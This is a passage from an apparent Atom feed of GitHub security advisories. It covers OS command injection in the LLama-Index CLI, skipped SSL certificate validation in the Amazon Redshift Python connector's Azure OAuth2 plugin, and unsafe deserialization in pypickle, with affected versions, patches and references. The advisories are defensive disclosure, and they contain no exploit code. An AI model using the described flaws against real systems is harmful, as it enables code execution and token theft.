<li><a href="https://github.com/run-llama/llama_index/commit/35bd221e948e40458052d30c6ef2779bc965b6d0">https://github.com/run-llama/llama_index/commit/35bd221e948e40458052d30c6ef2779bc965b6d0</a></li>
<li><a href="https://huntr.com/bounties/8ddf66e1-f74c-4d53-992b-76bc45cacac1">https://huntr.com/bounties/8ddf66e1-f74c-4d53-992b-76bc45cacac1</a></li>
<li><a href="https://github.com/advisories/GHSA-339r-cjv9-x78g">https://github.com/advisories/GHSA-339r-cjv9-x78g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-339r-cjv9-x78g</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-20T12:32:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[llama-index-cli] LLama-Index CLI OS command injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-g99h-56mw-8263</id>
        <link href="https://github.com/advisories/GHSA-g99h-56mw-8263"/>
        <updated>2025-05-28T16:07:50.000Z</updated>
        <content type="html"><![CDATA[<p>LLama-Index CLI prior to v0.4.1, corresponding to LLama-Index prior to v0.12.21, contains an OS command injection vulnerability. The vulnerability arises from the improper handling of the <code>--files</code> argument, which is directly passed into <code>os.system</code>. An attacker who controls the content of this argument can inject and execute arbitrary shell commands. This vulnerability can be exploited locally if the attacker has control over the CLI arguments, and remotely if a web application calls the LLama-Index CLI with a user-controlled filename. This issue can lead to arbitrary code execution on the affected system.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1753">https://nvd.nist.gov/vuln/detail/CVE-2025-1753</a></li>
<li><a href="https://github.com/run-llama/llama_index/commit/b57e76738c53ca82d88658b82f2d82d1c7839c7d">https://github.com/run-llama/llama_index/commit/b57e76738c53ca82d88658b82f2d82d1c7839c7d</a></li>
<li><a href="https://huntr.com/bounties/19e1c67e-1d77-451d-b10b-acbe99900b22">https://huntr.com/bounties/19e1c67e-1d77-451d-b10b-acbe99900b22</a></li>
<li><a href="https://github.com/advisories/GHSA-g99h-56mw-8263">https://github.com/advisories/GHSA-g99h-56mw-8263</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g99h-56mw-8263</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-28T12:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[redshift-connector] Issue with Amazon Redshift Python Connector and the BrowserAzureOAuth2CredentialsProvider plugin]]></title>
        <id>https://github.com/advisories/GHSA-r244-wg5g-6w2r</id>
        <link href="https://github.com/advisories/GHSA-r244-wg5g-6w2r"/>
        <updated>2025-05-28T14:57:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><a href="https://docs.aws.amazon.com/redshift/latest/mgmt/python-redshift-driver.html">Amazon Redshift Python Connector</a> is a pure Python connector to Redshift (i.e., driver) that implements the <a href="https://www.python.org/dev/peps/pep-0249/">Python Database API Specification 2.0</a>.</p>
<p>When the Amazon Redshift Python Connector is configured with the BrowserAzureOAuth2CredentialsProvider plugin, the driver skips the SSL certificate validation step for the Identity Provider. </p>
<h3 id="impact">Impact</h3>
<p>An insecure connection could allow an actor to intercept the token exchange process and retrieve an access token.</p>
<p><strong>Impacted versions:</strong> &gt;=2.0.872;&lt;=2.1.6</p>
<h3 id="patches">Patches</h3>
<p>Upgrade Amazon Redshift Python Connector to version 2.1.7 and ensure any forked or derivative code is patched to incorporate the new fixes.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our vulnerability reporting page [1] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] Vulnerability reporting page: <a href="https://aws.amazon.com/security/vulnerability-reporting">https://aws.amazon.com/security/vulnerability-reporting</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/amazon-redshift-python-driver/security/advisories/GHSA-r244-wg5g-6w2r">https://github.com/aws/amazon-redshift-python-driver/security/advisories/GHSA-r244-wg5g-6w2r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5279">https://nvd.nist.gov/vuln/detail/CVE-2025-5279</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins">https://aws.amazon.com/security/security-bulletins</a></li>
<li><a href="https://github.com/advisories/GHSA-r244-wg5g-6w2r">https://github.com/advisories/GHSA-r244-wg5g-6w2r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r244-wg5g-6w2r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-28T14:57:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypickle] pypickle unsafe deserialization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5qwj-342r-h886</id>
        <link href="https://github.com/advisories/GHSA-5qwj-342r-h886"/>
        <updated>2025-05-27T22:36:44.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in erdogant pypickle up to 1.1.5 and classified as problematic. Affected by this issue is the function load of the file pypickle/pypickle.py. The manipulation leads to deserialization. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used. Upgrading to version 2.0.0 is able to address this issue. The patch is identified as 14b4cae704a0bb4eb6723e238f25382d847a1917. It is recommended to upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5174">https://nvd.nist.gov/vuln/detail/CVE-2025-5174</a></li>
<li><a href="https://github.com/erdogant/pypickle/issues/2">https://github.com/erdogant/pypickle/issues/2</a></li>
<li><a href="https://github.com/erdogant/pypickle/issues/2#issuecomment-2889146579">https://github.com/erdogant/pypickle/issues/2#issuecomment-2889146579</a></li>
<li><a href="https://github.com/erdogant/pypickle/commit/14b4cae704a0bb4eb6723e238f25382d847a1917">https://github.com/erdogant/pypickle/commit/14b4cae704a0bb4eb6723e238f25382d847a1917</a></li>
<li><a href="https://github.com/erdogant/pypickle/releases/tag/2.0.0">https://github.com/erdogant/pypickle/releases/tag/2.0.0</a></li>
<li><a href="https://vuldb.com/?ctiid.310262">https://vuldb.com/?ctiid.310262</a></li>
<li><a href="https://vuldb.com/?id.310262">https://vuldb.com/?id.310262</a></li>
<li><a href="https://vuldb.com/?submit.579157">https://vuldb.com/?submit.579157</a></li>
<li><a href="https://github.com/advisories/GHSA-5qwj-342r-h886">https://github.com/advisories/GHSA-5qwj-342r-h886</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5qwj-342r-h886</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-26T09:30:45.000Z</published>
    </entry>
</feed>